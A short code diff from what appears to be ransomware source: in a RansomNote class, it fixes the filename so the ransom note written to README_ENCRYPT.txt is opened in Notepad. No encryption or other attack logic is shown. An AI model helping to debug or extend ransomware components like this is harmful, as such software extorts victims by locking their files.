@@ -98,7 +98,7 @@ class RansomNote:
         """
         with open("README_ENCRYPT.txt", "w", encoding="utf-8") as f:
             f.write(note)
-        os.system("notepad README_DECRYPT.txt")
+        os.system("notepad README_ENCRYPT.txt")
 
     @staticmethod
     def display_decryption_note():
